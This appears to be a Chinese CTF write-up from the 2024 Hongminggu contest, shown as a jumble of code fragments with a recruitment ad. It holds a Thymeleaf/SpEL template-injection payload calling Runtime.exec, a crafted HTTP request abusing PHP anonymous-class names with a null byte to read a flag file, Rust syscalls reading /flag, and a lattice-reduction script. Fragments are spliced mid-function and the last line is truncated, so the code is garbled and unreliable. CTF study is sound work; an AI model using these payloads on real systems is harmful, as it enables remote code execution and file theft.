# 2024第四届红明谷 WriteUp By Mini-Venom

> 原文: https://www.ctfiot.com/172270.html
> ID: 172270

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组

于是 S 就可以看作是由 chips 线性变换而来，并且 chips 只有 1 和 -1，于是直接对 S 求一个LLL


```
<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="Restricted Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo '小明是运维工程师，最近网站老是出现bug。';
    exit;
} else {
    $validUser = 'admin';
    $validPass = '2e525e29e465f45d8d7c56319fe73036';
<!--?php
Context context = new Context();
SpringTemplateEngine engine = new SpringTemplateEngine();
return engine.process(hostname, (IContext)context);
[[${T(java.lang.Boolean).forName("com.fasterxml.jackson.databind.ObjectMapper").newInstance().readValue("{}",T(java.lang.Boolean).forName("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression("T(Runtime).getRuntime().exec('calc')").getValue()}]]
/flag.php?ezphpPhp8=ko1sh1
<?php
if (isset($_GET['ezphpPhp8'])) {
    highlight_file(__FILE__);
} else {
    die("No");
}
$a = new class {
    function __construct()
    {
    }
GET /flag.php?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0 HTTP/1.1
Host: eci-2zef6aoe4x8c78fobzdc.cloudeci1.ichunqiu.com
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1711431296,1711937711,1712027510
fn main() {
    let mut buf = [0u8; 1024];
    let filename = "/flag\0";
    let fd: i32;
    let count: usize;
    unsafe {
        // open 系统调用
        core::
arch::
asm!(
            "syscall",
            in("rax") 2, // sys_open
            in("rdi") filename.as_ptr(),
            in("rsi") 0, // flags (O_RDONLY)
            lateout("rax") fd,
        );
        // 检查文件描述符是否有效
        if fd >= 0 {
            // read 系统调用
            core::
arch::
asm!(
                "syscall",
                in("rax") 0, // sys_read
                in("rdi") fd,
                in("rsi") buf.as_mut_ptr(),
                in("rdx") buf.len(),
                lateout("rax") count,
            );
            // write 系统调用，将读取的内容写到标准输出
            core::
arch::
asm!(
                "syscall",
                in("rax") 1, // sys_write
                in("rdi") 1, //
                in("rsi") buf.as_ptr(),
                in("rdx") count,
            );
        }
    }
}
with open("output.pkl", "rb") as file:
    signal = pickle.load(file)
single_signal_list = []
signals = []
signals_col = []
for i in range(0,len(signal)//1997):
    single_signal_list = signal[i*1997:(i+1)*1997]
    single_signal = round((sum(single_signal_list)/1997)*10)
    signals.append(single_signal)
    if len(signals) == 32:
        signals_col.append(signals)
        signals = [] 
signals_matrix = matrix(ZZ,signals_col)
chips = signals_matrix.LLL()[-11:-1]
M_T = chips * signals_matrix.T
for m in M_T:
    tag = m[0]
    flag=''.join(['0' if i == tag else '1' for i in m])
    print(int.to_bytes(int(flag,2),48,'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1712623703.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1712623704.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1712623704.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/9-1712623705.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/1-1712623705.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1712623705.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/3-1712623706.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1712623706.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/9-1712623706.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1712623707.webp)